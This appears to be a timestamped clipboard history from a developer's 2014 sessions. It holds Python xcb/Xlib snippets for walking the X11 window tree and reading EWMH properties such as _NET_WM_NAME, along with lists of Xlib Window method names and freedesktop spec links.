* Thu 06 Feb 2014 05:06:22 AM JST
print(rep.children[0])
* Thu 06 Feb 2014 05:06:27 AM JST
re=c.core.GetProperty(False, rep.children[0], NET_WM_NAME, UTF8_STRING, 0, 65535).reply()
* Thu 06 Feb 2014 05:06:40 AM JST
            if re.value_len:
                print(i)

* Thu 06 Feb 2014 05:07:02 AM JST
for i, ch in enumerate(children):
    try:
        rep=c.core.QueryTree(ch).reply()
        # print('')
        # print(i)
        if rep.children_len:
            print(rep.children[0])
            re=c.core.GetProperty(False, rep.children[0], NET_WM_NAME, UTF8_STRING, 0, 65535).reply()
            if re.value_len:
                print(i)
            rep2=c.core.QueryTree(rep.children[0]).reply()
            if rep2.children_len:
                print(rep.children[0])
                re2=c.core.GetProperty(False, rep2.children[0], NET_WM_NAME, UTF8_STRING, 0, 65535).reply()
                if re.value_len:
                    print(i)

        # print(rep.children_len)
    except xcb.xproto.BadWindow:
        continue
* Thu 06 Feb 2014 05:08:41 AM JST
67109178
* Thu 06 Feb 2014 05:11:00 AM JST
re=c.core.GetProperty(False, rr.children[0], NET_WM_NAME, UTF8_STRI
* Thu 06 Feb 2014 05:31:24 AM JST
re=c.core.GetProperty(False, rr.children[0], NET_WM_NAME, UTF8_STRING, 0, 65535).
* Thu 06 Feb 2014 05:33:24 AM JST
rep=c.core.InternAtom(True, len('_NET_WM_NAME'), '_NET_WM_NAME').reply()
* Thu 06 Feb 2014 05:33:36 AM JST
NET_WM_NAME=rep.atom
* Thu 06 Feb 2014 05:33:58 AM JST
=rep.atom
* Thu 06 Feb 2014 05:34:00 AM JST
NET_WM_NAME
* Thu 06 Feb 2014 05:34:24 AM JST
NET_WM_NAME = CON.core.InternAtom(True,
                                  len('_NET_WM_NAME'),
                                  '_NET_WM_NAME').reply().atom

* Thu 06 Feb 2014 05:34:32 AM JST
UTF8_STRING
* Thu 06 Feb 2014 05:34:40 AM JST
_NET_WM_NAME
* Thu 06 Feb 2014 05:34:44 AM JST
UTF8_STRING
* Thu 06 Feb 2014 05:35:01 AM JST
                                  
* Thu 06 Feb 2014 05:35:18 AM JST
UTF8_STRING
* Thu 06 Feb 2014 06:10:12 AM JST
LIST.append()
* Thu 06 Feb 2014 06:11:51 AM JST
    # re = CON.core.GetProperty(False, win,
    #                         NET_WM_NAME, UTF8_STRING, 0, 65535).reply()

* Thu 06 Feb 2014 06:12:17 AM JST
    # if 0 < re.value_len:
    #     print(win)
    #     print(re.value.buf())

* Thu 06 Feb 2014 06:12:24 AM JST

* Thu 06 Feb 2014 06:12:24 AM JST

* Thu 06 Feb 2014 06:12:24 AM JST
        print(win)

* Thu 06 Feb 2014 06:38:32 AM JST
pass
* Thu 06 Feb 2014 06:38:40 AM JST

* Thu 06 Feb 2014 06:38:40 AM JST

* Thu 06 Feb 2014 06:38:40 AM JST
        self.winlist = []

* Thu 06 Feb 2014 06:38:45 AM JST
self.
* Thu 06 Feb 2014 06:39:00 AM JST

* Thu 06 Feb 2014 06:39:00 AM JST

* Thu 06 Feb 2014 06:39:00 AM JST
        append

* Thu 06 Feb 2014 06:39:58 AM JST
self.winlist = []
* Thu 06 Feb 2014 06:40:24 AM JST
pass
* Thu 06 Feb 2014 06:40:37 AM JST

* Thu 06 Feb 2014 06:40:37 AM JST

* Thu 06 Feb 2014 06:40:38 AM JST
        self.winlist.append()

* Thu 06 Feb 2014 06:43:52 AM JST
reply = CON.core.QueryTree(win).reply()
* Thu 06 Feb 2014 06:46:34 AM JST
CON
* Thu 06 Feb 2014 06:56:04 AM JST
WindowID
* Thu 06 Feb 2014 06:59:08 AM JST

* Thu 06 Feb 2014 06:59:08 AM JST

* Thu 06 Feb 2014 06:59:08 AM JST
        print('DEBUG-1-tree.py')

* Thu 06 Feb 2014 07:01:52 AM JST
int
* Thu 06 Feb 2014 07:01:59 AM JST

* Thu 06 Feb 2014 07:01:59 AM JST

* Thu 06 Feb 2014 07:01:59 AM JST
        super(WindowID, self).__init__(window_id)

* Thu 06 Feb 2014 07:01:59 AM JST
        super(WindowID, self).__init__(window_id)

* Thu 06 Feb 2014 07:01:59 AM JST
        super(WindowID, self).__init__(window_id)
        # int.__init__(self, window_id)

* Thu 06 Feb 2014 07:02:12 AM JST
self.window
* Thu 06 Feb 2014 07:03:29 AM JST
print(
* Thu 06 Feb 2014 07:06:19 AM JST
# for i in LIST:
#     re = CON.core.GetProperty(False, i,
#                             NET_WM_NAME, UTF8_STRING, 0, 65535).reply()
#     if 0 < re.value_len:
#         print(re.value.buf())

* Thu 06 Feb 2014 07:06:26 AM JST
LIST
* Thu 06 Feb 2014 07:07:51 AM JST

* Thu 06 Feb 2014 07:07:51 AM JST

* Thu 06 Feb 2014 07:07:51 AM JST
                # self._query_tree(child)

* Thu 06 Feb 2014 07:46:53 AM JST
object
* Thu 06 Feb 2014 07:47:42 AM JST
*args, **kwargs
* Thu 06 Feb 2014 08:01:45 AM JST
NET_WM_NAME = CON.core.InternAtom(True,
                                  len('_NET_WM_NAME'),
                                  '_NET_WM_NAME').reply().atom

* Thu 06 Feb 2014 08:03:01 AM JST
CON
* Thu 06 Feb 2014 08:10:28 AM JST
*args, **kwargs
* Thu 06 Feb 2014 08:10:36 AM JST
core
* Thu 06 Feb 2014 08:11:49 AM JST
net_wm_name
* Thu 06 Feb 2014 08:12:06 AM JST
                                               
* Thu 06 Feb 2014 08:12:16 AM JST
                                               
* Thu 06 Feb 2014 08:12:29 AM JST
.atom
* Thu 06 Feb 2014 08:13:57 AM JST
'UTF8_STRING'
* Thu 06 Feb 2014 08:16:38 AM JST
reply.atom
* Thu 06 Feb 2014 08:20:04 AM JST
CON = xcb.connect()
* Thu 06 Feb 2014 08:20:17 AM JST
class Connection(object):
    r"""Connection
    """
    Atom = xcb.xproto.Atom

    def __init__(self, *args, **kwargs):
        r"""

        @Arguments:
        - `displayname`:
        """
        self.connection = xcb.connect(*args, **kwargs)
        self.cache_atom = {}

    def getatom(self, name):
        r"""SUMMARY

        getatom(name)

        @Arguments:
        - `name`:

        @Return:
        """
        if hasattr(self.Atom, name):
            return getattr(self.Atom, name)
        if name in self.cache_atom:
            return self.cache_atom[name]
        reply = self.connection.core.InternAtom(True, len(name), name).reply()
        self.cache_atom[name] = reply.atom
        return reply.atom


class WindowID(object):
    r"""
    """

    def __init__(self, window_id, connection):
        r"""SUMMARY

        __init__(window_id, connection)

        @Arguments:
        - `window_id`:
        - `connection`:

        @Return:
        """
        self.window = window_id
        self.connection = connection
        self.winlist = []

    def query_tree(self, ):
        r"""SUMMARY

        query_tree()

        @Return:
        """
        self.winlist = []
        self._query_tree(self.window)
        return self.winlist

    def _query_tree(self, win):
        r"""SUMMARY

        _query_tree()

        @Return:
        """
        self.winlist.append(win)
        reply = self.connection.core.QueryTree(win).reply()
        if 0 < reply.children_len:
            for child in reply.children:
                wid = WindowID(child, self.connection)
                self.winlist.extend(wid.query_tree())

* Thu 06 Feb 2014 08:21:26 AM JST
NET_WM_NAME
* Thu 06 Feb 2014 08:21:38 AM JST
'UTF8_STRING'
* Fri 07 Feb 2014 05:47:36 AM JST
deb http://www.bouml.fr/apt/squeeze squeeze non-free
* Fri 07 Feb 2014 05:47:40 AM JST
squeeze
* Fri 07 Feb 2014 05:47:45 AM JST
wheezy
* Fri 07 Feb 2014 10:16:59 PM JST
get_wm_name
* Fri 07 Feb 2014 10:17:41 PM JST
/usr/share/pyshared/Xlib/
* Fri 07 Feb 2014 10:30:36 PM JST
a._window.get_full_property()
* Fri 07 Feb 2014 10:34:39 PM JST
'_NET_WM_NAME'
* Fri 07 Feb 2014 10:38:43 PM JST
p=a._window.get_full_property(, UTF8_STRING)
* Fri 07 Feb 2014 10:53:42 PM JST
GetProperty
* Fri 07 Feb 2014 10:54:32 PM JST
c.core.GetProperty(False, root.root, xcb.xproto.Atom.)
* Fri 07 Feb 2014 10:58:01 PM JST
'_NET_CLIENT_LIST'
* Fri 07 Feb 2014 11:01:07 PM JST
_NET_WM_PID
* Fri 07 Feb 2014 11:04:54 PM JST
format
* Fri 07 Feb 2014 11:05:26 PM JST
type
* Fri 07 Feb 2014 11:05:29 PM JST
format
* Fri 07 Feb 2014 11:18:22 PM JST
xprop | grep _NET_WM_ALLOWED_ACTIONS
* Fri 07 Feb 2014 11:26:26 PM JST
ListProperties
* Sat 08 Feb 2014 12:57:00 AM JST
xinerama_get_screen_count()
* Sat 08 Feb 2014 12:57:09 AM JST
get_wm_name()
* Sat 08 Feb 2014 12:59:20 AM JST
get_wm_class()
* Sat 08 Feb 2014 12:59:33 AM JST
get_geometry
* Sat 08 Feb 2014 01:09:06 AM JST
_NET_ACTIVE_WINDOW
* Sat 08 Feb 2014 01:13:21 AM JST
_NET_WM_ACTION_FULLSCREEN
* Sat 08 Feb 2014 02:10:27 AM JST
http://standards.freedesktop.org/wm-spec/1.3/ar01s03.html#id3032300
* Sat 08 Feb 2014 02:43:22 AM JST
NET_NUMBER_OF_DESKTOPS
* Sat 08 Feb 2014 02:46:41 AM JST
NET_NUMBER_OF_DESKTOPS
* Sat 08 Feb 2014 02:53:31 AM JST
This property SHOULD be set and updated by the Window Manager to indicate the
number of virtual desktops.

A Pager can request a change in the number of desktops by sending a
_NET_NUMBER_OF_DESKTOPS message to the root window:

* Sat 08 Feb 2014 03:04:28 AM JST
_NET_WORKAREA
* Sat 08 Feb 2014 03:06:39 AM JST
_NET_VIRTUAL_ROOTS
* Sat 08 Feb 2014 03:07:07 AM JST
_NET_DESKTOP_NAMES
* Sat 08 Feb 2014 03:09:22 AM JST
_NET_CURRENT_DESKTOP
* Sat 08 Feb 2014 03:09:40 AM JST
d.intern_atom('_NET_CURRENT_DESKTOP')
* Sat 08 Feb 2014 03:10:09 AM JST
_NET_CURRENT_DESKTOP
* Sat 08 Feb 2014 03:11:54 AM JST
_NET_WM_DESKTOP
* Sat 08 Feb 2014 03:12:14 AM JST
d.intern_atom('_NET_WM_DESKTOP')
* Sat 08 Feb 2014 03:12:47 AM JST
_NET_DESKTOP_NAMES
* Sat 08 Feb 2014 03:14:27 AM JST
_NET_WM_DESKTOP
* Sat 08 Feb 2014 03:14:52 AM JST
_NET_DESKTOP_GEOMETRY
* Sat 08 Feb 2014 03:40:09 AM JST
http://standards.freedesktop.org/wm-spec/1.3/ar01s03.html#id3032483
* Sat 08 Feb 2014 03:43:00 AM JST
_NET_DESKTOP_NAMES
* Sat 08 Feb 2014 03:47:59 AM JST
_NET_ACTIVE_WINDOW
* Sat 08 Feb 2014 03:49:15 AM JST
_NET_ACTIVE_WINDOW
* Sat 08 Feb 2014 03:55:00 AM JST
_NET_WM_USER_TIME
* Sat 08 Feb 2014 03:59:01 AM JST
_NET_WM_STATE_DEMANDS_ATTENTION
* Sat 08 Feb 2014 03:59:11 AM JST
_NET_WORKAREA
* Sat 08 Feb 2014 04:01:28 AM JST
_NET_SUPPORTING_WM_CHECK
* Sat 08 Feb 2014 04:04:24 AM JST
_NET_SUPPORTING_WM_CHECK
* Sat 08 Feb 2014 04:06:05 AM JST
_NET_VIRTUAL_ROOTS
* Sat 08 Feb 2014 04:06:14 AM JST
_NET_VIRTUAL_ROOTS
* Sat 08 Feb 2014 04:06:43 AM JST
_NET_DESKTOP_LAYOUT
* Sat 08 Feb 2014 04:07:44 AM JST
_NET_SHOWING_DESKTOP
* Sat 08 Feb 2014 04:38:09 AM JST
_NET_CLOSE_WINDOW
* Sat 08 Feb 2014 04:38:42 AM JST
_NET_WM_NAME
* Sat 08 Feb 2014 04:41:28 AM JST
http://tronche.com/gui/x/xlib/window-information/properties-and-atoms.html
* Sat 08 Feb 2014 04:41:59 AM JST
/properties-and-atoms.html
* Sat 08 Feb 2014 04:44:20 AM JST
get_attributes
* Sat 08 Feb 2014 04:44:54 AM JST
change_attributes
* Sat 08 Feb 2014 04:47:56 AM JST
get_geometry
* Sat 08 Feb 2014 04:48:16 AM JST
get_
* Sat 08 Feb 2014 04:49:51 AM JST
get_geometry
* Sat 08 Feb 2014 06:26:24 AM JST
class Window / class Window
class Window / create_window
class Window / change_attributes
class Window / get_attributes
class Window / destroy
class Window / destroy_sub_windows
class Window / change_save_set
class Window / reparent
class Window / map
class Window / map_sub_windows
class Window / unmap
class Window / unmap_sub_windows
class Window / configure
class Window / circulate
class Window / raise_window
class Window / query_tree
class Window / change_property
class Window / delete_property
class Window / get_property
class Window / get_full_property
class Window / list_properties
class Window / set_selection_owner
class Window / convert_selection
class Window / send_event
class Window / grab_pointer
class Window / grab_button
class Window / ungrab_button
class Window / grab_keyboard
class Window / grab_key
class Window / ungrab_key
class Window / query_pointer
class Window / get_motion_events
class Window / translate_coords
class Window / warp_pointer
class Window / set_input_focus
class Window / clear_area
class Window / create_colormap
class Window / list_installed_colormaps
class Window / rotate_properties
class Window / set_wm_name
class Window / get_wm_name
class Window / set_wm_icon_name
class Window / get_wm_icon_name
class Window / set_wm_class
class Window / get_wm_class
class Window / set_wm_transient_for
class Window / get_wm_transient_for
class Window / set_wm_protocols
class Window / get_wm_protocols
class Window / set_wm_colormap_windows
class Window / get_wm_colormap_windows
class Window / set_wm_client_machine
class Window / get_wm_client_machine
class Window / set_wm_normal_hints
class Window / get_wm_normal_hints
class Window / set_wm_hints
class Window / get_wm_hints
class Window / set_wm_state
class Window / get_wm_state
class Window / set_wm_icon_size
class Window / get_wm_icon_size
class Window / _get_struct_prop
class Window / _set_struct_prop
class Pixmap / class Pixmap
class Pixmap / free
class Pixmap / create_cursor

* Sat 08 Feb 2014 06:26:41 AM JST
class Pixmap / 
* Sat 08 Feb 2014 06:26:42 AM JST
class Pixmap / 
* Sat 08 Feb 2014 06:26:42 AM JST
class Pixmap / 
* Sat 08 Feb 2014 06:26:42 AM JST
class Window / 
* Sat 08 Feb 2014 06:26:42 AM JST
class Window / 
* Sat 08 Feb 2014 06:26:42 AM JST
class Window / 
* Sat 08 Feb 2014 06:26:42 AM JST
class Window / 
* Sat 08 Feb 2014 06:26:43 AM JST
class Window / 
* Sat 08 Feb 2014 06:26:43 AM JST
class Window / 
* Sat 08 Feb 2014 06:26:43 AM JST
class Window / 
* Sat 08 Feb 2014 06:26:43 AM JST
class Window / 
* Sat 08 Feb 2014 06:26:43 AM JST
class Window / 
* Sat 08 Feb 2014 06:26:43 AM JST
class Window / 
* Sat 08 Feb 2014 06:26:43 AM JST
class Window / 
* Sat 08 Feb 2014 06:26:43 AM JST
class Window / 
* Sat 08 Feb 2014 06:26:43 AM JST
class Window / 
* Sat 08 Feb 2014 06:26:43 AM JST
class Window / 
* Sat 08 Feb 2014 06:26:43 AM JST
class Window / 
* Sat 08 Feb 2014 06:26:43 AM JST
class Window / 
* Sat 08 Feb 2014 06:26:43 AM JST
class Window / 
* Sat 08 Feb 2014 06:26:43 AM JST
class Window / 
* Sat 08 Feb 2014 06:26:43 AM JST
class Window / 
* Sat 08 Feb 2014 06:26:44 AM JST
class Window / 
* Sat 08 Feb 2014 06:26:44 AM JST
class Window / 
* Sat 08 Feb 2014 06:26:44 AM JST
class Window / 
* Sat 08 Feb 2014 06:26:44 AM JST
class Window / 
* Sat 08 Feb 2014 06:26:44 AM JST
class Window / 
* Sat 08 Feb 2014 06:26:44 AM JST
class Window / 
* Sat 08 Feb 2014 06:26:44 AM JST
class Window / 
* Sat 08 Feb 2014 06:26:44 AM JST
class Window / 
* Sat 08 Feb 2014 06:26:44 AM JST
class Window / 
* Sat 08 Feb 2014 06:26:44 AM JST
class Window / 
* Sat 08 Feb 2014 06:26:44 AM JST
class Window / 
* Sat 08 Feb 2014 06:26:44 AM JST
class Window / 
* Sat 08 Feb 2014 06:26:44 AM JST
class Window / 
* Sat 08 Feb 2014 06:26:44 AM JST
class Window / 
* Sat 08 Feb 2014 06:26:44 AM JST
class Window / 
* Sat 08 Feb 2014 06:26:45 AM JST
class Window / 
* Sat 08 Feb 2014 06:26:45 AM JST
class Window / 
* Sat 08 Feb 2014 06:26:45 AM JST
class Window / 
* Sat 08 Feb 2014 06:26:45 AM JST
class Window / 
* Sat 08 Feb 2014 06:26:45 AM JST
class Window / 
* Sat 08 Feb 2014 06:26:45 AM JST
class Window / 
* Sat 08 Feb 2014 06:26:45 AM JST
class Window / 
* Sat 08 Feb 2014 06:26:45 AM JST
class Window / 
* Sat 08 Feb 2014 06:26:45 AM JST
class Window / 
* Sat 08 Feb 2014 06:26:45 AM JST
class Window / 
* Sat 08 Feb 2014 06:26:45 AM JST
class Window / 
* Sat 08 Feb 2014 06:26:45 AM JST
class Window / 
* Sat 08 Feb 2014 06:26:45 AM JST
class Window / 
* Sat 08 Feb 2014 06:26:45 AM JST
class Window / 
* Sat 08 Feb 2014 06:26:45 AM JST
class Window / 
* Sat 08 Feb 2014 06:26:46 AM JST
class Window / 
* Sat 08 Feb 2014 06:26:46 AM JST
class Window / 
* Sat 08 Feb 2014 06:26:46 AM JST
class Window / 
* Sat 08 Feb 2014 06:26:46 AM JST
class Window / 
* Sat 08 Feb 2014 06:26:46 AM JST
class Window / 
* Sat 08 Feb 2014 06:26:46 AM JST
class Window / 
* Sat 08 Feb 2014 06:26:46 AM JST
class Window / 
* Sat 08 Feb 2014 06:26:46 AM JST
class Window / 
* Sat 08 Feb 2014 06:26:46 AM JST
class Window / 
* Sat 08 Feb 2014 06:26:46 AM JST
class Window / 
* Sat 08 Feb 2014 06:26:46 AM JST
class Window / 
* Sat 08 Feb 2014 06:26:46 AM JST
class Window / 
* Sat 08 Feb 2014 06:26:46 AM JST
class Window / 
* Sat 08 Feb 2014 06:26:46 AM JST
class Window / 
* Sat 08 Feb 2014 06:26:53 AM JST
class Window
create_window
change_attributes
get_attributes
destroy
destroy_sub_windows
change_save_set
reparent
map
map_sub_windows
unmap
unmap_sub_windows
configure
circulate
raise_window
query_tree
change_property
delete_property
get_property
get_full_property
list_properties
set_selection_owner
convert_selection
send_event
grab_pointer
grab_button
ungrab_button
grab_keyboard
grab_key
ungrab_key
query_pointer
get_motion_events
translate_coords
warp_pointer
set_input_focus
clear_area
create_colormap
list_installed_colormaps
rotate_properties
set_wm_name
get_wm_name
set_wm_icon_name
get_wm_icon_name
set_wm_class
get_wm_class
set_wm_transient_for
get_wm_transient_for
set_wm_protocols
get_wm_protocols
set_wm_colormap_windows
get_wm_colormap_windows
set_wm_client_machine
get_wm_client_machine
set_wm_normal_hints
get_wm_normal_hints
set_wm_hints
get_wm_hints
set_wm_state
get_wm_state
set_wm_icon_size
get_wm_icon_size
_get_struct_prop
_set_struct_prop
class Pixmap
free
create_cursor

* Sat 08 Feb 2014 06:58:06 AM JST
get_wm_client_machine()
* Sat 08 Feb 2014 08:11:35 AM JST
get_net_wm_pid
get_wm_name
set_wm_name

set_wm_icon_name
get_wm_icon_name
set_wm_class
get_wm_class
set_wm_transient_for
get_wm_transient_for
set_wm_protocols
get_wm_protocols
set_wm_colormap_windows
get_wm_colormap_windows
* Sat 08 Feb 2014 08:11:51 AM JST
get_net_wm_pid
get_wm_name
get_wm_icon_name
get_wm_class
get_wm_transient_for
get_wm_protocols
get_wm_colormap_windows

* Sat 08 Feb 2014 08:11:56 AM JST
set_wm_name
set_wm_icon_name
set_wm_class
set_wm_transient_for
set_wm_protocols
set_wm_colormap_windows
get_net_wm_pid
get_wm_name
get_wm_icon_name
get_wm_class
get_wm_transient_for
get_wm_protocols
get_wm_colormap_windows

* Sat 08 Feb 2014 08:48:37 AM JST
    def hello(self, ):
        pass

    def hello2(self, ):
        pass

* Sat 08 Feb 2014 08:48:47 AM JST
    def hello4(self, ):
        pass
* Sat 08 Feb 2014 08:48:53 AM JST
    def hello$1(self, ):
        pass

* Sat 08 Feb 2014 08:49:21 AM JST
    
* Sat 08 Feb 2014 09:18:47 AM JST
get_NET_SUPPORTED
get_NET_CLIENT_LIST
get_NET_CLIENT_LIST_STACKING
get_NET_NUMBER_OF_DESKTOPS
get_NET_WORKAREA
get_NET_VIRTUAL_ROOTS
get_NET_DESKTOP_NAMES
get_NET_CURRENT_DESKTOP
get_NET_WM_DESKTOP
get_NET_DESKTOP_GEOMETRY
get_NET_ACTIVE_WINDOW
get_NET_WM_USER_TIME
get_NET_SUPPORTING_WM_CHECK
* Sat 08 Feb 2014 09:19:04 AM JST
set_NET_SUPPORTED
set_NET_CLIENT_LIST
set_NET_CLIENT_LIST_STACKING
set_NET_NUMBER_OF_DESKTOPS
set_NET_WORKAREA
set_NET_VIRTUAL_ROOTS
set_NET_DESKTOP_NAMES
set_NET_CURRENT_DESKTOP
set_NET_WM_DESKTOP
set_NET_DESKTOP_GEOMETRY
set_NET_ACTIVE_WINDOW
set_NET_WM_USER_TIME
set_NET_SUPPORTING_WM_CHECK
* Sat 08 Feb 2014 11:04:28 AM JST
class Window
create_window
change_attributes
get_attributes
destroy
destroy_sub_windows
change_save_set
reparent
map
map_sub_windows
unmap
unmap_sub_windows
configure
circulate
raise_window
query_tree
change_property
delete_property
get_property
get_full_property
list_properties
set_selection_owner
convert_selection
send_event
grab_pointer
grab_button
grab_keyboard
grab_key
ungrab_button
ungrab_key
query_pointer
get_motion_events
translate_coords
warp_pointer
set_input_focus
clear_area
create_colormap
list_installed_colormaps
rotate_properties
set_wm_client_machine
get_wm_client_machine
set_wm_normal_hints
get_wm_normal_hints
set_wm_hints
get_wm_hints
set_wm_state
get_wm_state
set_wm_icon_size
get_wm_icon_size
_get_struct_prop
_set_struct_prop
class Pixmap
free
create_cursor

* Sat 08 Feb 2014 11:04:45 AM JST
set_wm_client_machine
get_wm_client_machine
set_wm_normal_hints
get_wm_normal_hints
set_wm_hints
get_wm_hints
set_wm_state
get_wm_state
set_wm_icon_size
get_wm_icon_size

* Sat 08 Feb 2014 11:05:23 AM JST
set_wm_client_machine
set_wm_normal_hints
set_wm_hints
set_wm_state
set_wm_icon_size
get_wm_client_machine
get_wm_normal_hints
get_wm_hints
get_wm_state
get_wm_icon_size

* Sat 08 Feb 2014 11:06:55 AM JST
class Window
create_window
change_attributes
get_attributes
destroy
destroy_sub_windows
change_save_set
reparent
map
map_sub_windows
unmap
unmap_sub_windows
configure
circulate
raise_window
query_tree
change_property
delete_property
get_property
get_full_property
list_properties
set_selection_owner
convert_selection
send_event
grab_pointer
grab_button
grab_keyboard
grab_key
ungrab_button
ungrab_key
query_pointer
get_motion_events
translate_coords
warp_pointer
set_input_focus
clear_area
create_colormap
list_installed_colormaps
rotate_properties
_get_struct_prop
_set_struct_prop
class Pixmap
free
create_cursor

* Sat 08 Feb 2014 11:08:13 AM JST
class Window
create_window
change_attributes
get_attributes
destroy
destroy_sub_windows
change_save_set
reparent
map
map_sub_windows
unmap
unmap_sub_windows
configure
circulate
raise_window
query_tree
set_selection_owner
convert_selection
send_event
grab_pointer
grab_button
grab_keyboard
grab_key
ungrab_button
ungrab_key
query_pointer
get_motion_events
translate_coords
warp_pointer
set_input_focus
clear_area
create_colormap
list_installed_colormaps
rotate_properties
_get_struct_prop
_set_struct_prop
class Pixmap
free
create_cursor

* Sat 08 Feb 2014 11:16:05 AM JST
set_input_focus
* Sat 08 Feb 2014 11:17:37 AM JST
CurrentTime
* Sat 08 Feb 2014 11:27:24 AM JST
create_window
change_attributes
get_attributes
destroy
destroy_sub_windows
change_save_set
reparent
map
map_sub_windows
unmap
unmap_sub_windows
configure
circulate
raise_window
query_tree
set_selection_owner
convert_selection
send_event
grab_pointer
grab_button
grab_keyboard
grab_key
ungrab_button
ungrab_key
query_pointer
get_motion_events
translate_coords
warp_pointer
set_input_focus
clear_area
create_colormap
list_installed_colormaps
_get_struct_prop
_set_struct_prop


* Sun 09 Feb 2014 03:25:00 AM JST
set_wm_name
set_wm_icon_name
set_wm_class
set_wm_transient_for
set_wm_protocols
set_wm_colormap_windows
set_wm_client_machine
set_wm_normal_hints
set_wm_hints
set_wm_state
set_wm_icon_size
get_wm_name
get_wm_icon_name
get_wm_class
get_wm_transient_for
get_wm_protocols
get_wm_colormap_windows
get_wm_client_machine
get_wm_normal_hints
get_wm_hints
get_wm_state
get_wm_icon_size

* Sun 09 Feb 2014 03:25:14 AM JST
get_wm_command
* Sun 09 Feb 2014 03:26:16 AM JST

* Sun 09 Feb 2014 03:26:16 AM JST

* Sun 09 Feb 2014 03:26:16 AM JST
get_wm_icon_name

* Sun 09 Feb 2014 03:26:36 AM JST

* Sun 09 Feb 2014 03:26:36 AM JST

* Sun 09 Feb 2014 03:26:37 AM JST
get_wm_name

* Sun 09 Feb 2014 03:27:10 AM JST
get_zoom_hints
* Sun 09 Feb 2014 07:30:07 AM JST
set_wm_class
set_wm_client_machine
set_wm_colormap_windows
set_wm_command
set_wm_hints
set_wm_icon_name
set_wm_icon_size
set_wm_name
set_wm_normal_hints
set_wm_protocols
set_wm_state
set_wm_transient_for
set_zoom_hints
get_wm_class
get_wm_client_machine
get_wm_colormap_windows
get_wm_command
get_wm_hints
get_wm_icon_name
get_wm_icon_size
get_wm_name
get_wm_normal_hints
get_wm_protocols
get_wm_state
get_wm_transient_for
get_zoom_hints

* Sun 09 Feb 2014 07:48:43 AM JST
CLIPBOARD
* Sun 09 Feb 2014 07:51:42 AM JST
CLIPBOARD
* Sun 09 Feb 2014 07:51:56 AM JST
PRIMARY
* Sun 09 Feb 2014 07:53:57 AM JST

* Sun 09 Feb 2014 07:53:59 AM JST

* Sun 09 Feb 2014 07:54:03 AM JST

* Sun 09 Feb 2014 07:54:06 AM JST

* Sun 09 Feb 2014 07:54:09 AM JST

* Sun 09 Feb 2014 07:54:11 AM JST

* Sun 09 Feb 2014 07:54:14 AM JST

* Sun 09 Feb 2014 07:54:18 AM JST

* Sun 09 Feb 2014 07:54:21 AM JST

* Sun 09 Feb 2014 07:54:21 AM JST

* Sun 09 Feb 2014 07:54:21 AM JST
get_cut_buffer

* Sun 09 Feb 2014 07:54:26 AM JST
get_cut_buffer0
get_cut_buffer1
get_cut_buffer2
get_cut_buffer3
get_cut_buffer4
get_cut_buffer5
get_cut_buffer6
get_cut_buffer7

* Sun 09 Feb 2014 07:54:56 AM JST
set_primary
set_secondary

* Sun 09 Feb 2014 07:55:11 AM JST
set
* Sun 09 Feb 2014 07:55:13 AM JST
set
* Sun 09 Feb 2014 07:55:54 AM JST
get_RGB_BEST_MAP    
get_RGB_BLUE_MAP    
get_RGB_DEFAULT_MAP 
get_RGB_GRAY_MAP    
get_RGB_GREEN_MAP   
get_RGB_RED_MAP     
* Sun 09 Feb 2014 07:56:03 AM JST
get
* Sun 09 Feb 2014 07:56:04 AM JST
get
* Sun 09 Feb 2014 07:56:04 AM JST
get
* Sun 09 Feb 2014 07:56:04 AM JST
get
* Sun 09 Feb 2014 07:56:04 AM JST
get
* Sun 09 Feb 2014 07:56:04 AM JST
get
* Sun 09 Feb 2014 07:56:19 AM JST
get_resource_manager
* Sun 09 Feb 2014 08:01:08 AM JST
set_primary
set_secondary
set_cut_buffer0
set_cut_buffer1
set_cut_buffer2
set_cut_buffer3
set_cut_buffer4
set_cut_buffer5
set_cut_buffer6
set_cut_buffer7
set_wm_class
set_wm_client_machine
set_wm_colormap_windows
set_wm_command
set_wm_hints
set_wm_icon_name
set_wm_icon_size
set_wm_name
set_wm_normal_hints
set_wm_protocols
set_wm_state
set_wm_transient_for
set_zoom_hints
set_RGB_BEST_MAP
set_RGB_BLUE_MAP
set_RGB_DEFAULT_MAP
set_RGB_GRAY_MAP
set_RGB_GREEN_MAP
set_RGB_RED_MAP
set_resource_manager
get_primary
get_secondary
get_cut_buffer0
get_cut_buffer1
get_cut_buffer2
get_cut_buffer3
get_cut_buffer4
get_cut_buffer5
get_cut_buffer6
get_cut_buffer7
get_wm_class
get_wm_client_machine
get_wm_colormap_windows
get_wm_command
get_wm_hints
get_wm_icon_name
get_wm_icon_size
get_wm_name
get_wm_normal_hints
get_wm_protocols
get_wm_state
get_wm_transient_for
get_zoom_hints
get_RGB_BEST_MAP
get_RGB_BLUE_MAP
get_RGB_DEFAULT_MAP
get_RGB_GRAY_MAP
get_RGB_GREEN_MAP
get_RGB_RED_MAP
get_resource_manager
* Sun 09 Feb 2014 08:19:01 AM JST
http://standards.freedesktop.org/wm-spec/wm-spec-latest.html
* Sun 09 Feb 2014 08:21:41 AM JST
Desktop
* Sun 09 Feb 2014 08:21:50 AM JST
Dock
* Sun 09 Feb 2014 08:21:56 AM JST
Toolbar
* Sun 09 Feb 2014 08:22:01 AM JST
Menu
* Sun 09 Feb 2014 08:22:06 AM JST
Utility
* Sun 09 Feb 2014 08:22:11 AM JST
Splash
* Sun 09 Feb 2014 08:22:16 AM JST
Dialog
* Sun 09 Feb 2014 08:22:21 AM JST
Normal
* Sun 09 Feb 2014 08:22:24 AM JST
Desktop Dock Toolbar Menu Utility Splash Dialog Normal
* Sun 09 Feb 2014 08:55:08 AM JST
WindowManager
* Sun 09 Feb 2014 09:08:51 AM JST
_NET_WM_NAME
* Sun 09 Feb 2014 09:09:15 AM JST
_NET_NUMBER_OF_DESKTOPS
* Sun 09 Feb 2014 09:09:26 AM JST
_NET_CURRENT_DESKTOP
* Sun 09 Feb 2014 09:10:38 AM JST
_NET_WM_STATE_MODAL
* Sun 09 Feb 2014 09:10:43 AM JST
_NET_WM_STATE_STICKY
* Sun 09 Feb 2014 09:10:47 AM JST
_NET_WM_STATE_MAXIMIZED_VERT
* Sun 09 Feb 2014 09:10:53 AM JST
_NET_WM_STATE_MAXIMIZED_HORZ
* Sun 09 Feb 2014 09:10:59 AM JST
_NET_WM_STATE_SHADED
* Sun 09 Feb 2014 09:11:05 AM JST
_NET_WM_STATE_SKIP_TASKBAR
* Sun 09 Feb 2014 09:11:11 AM JST
_NET_WM_STATE_SKIP_PAGER
* Sun 09 Feb 2014 09:11:20 AM JST
_NET_WM_STATE_HIDDEN
* Sun 09 Feb 2014 09:11:27 AM JST
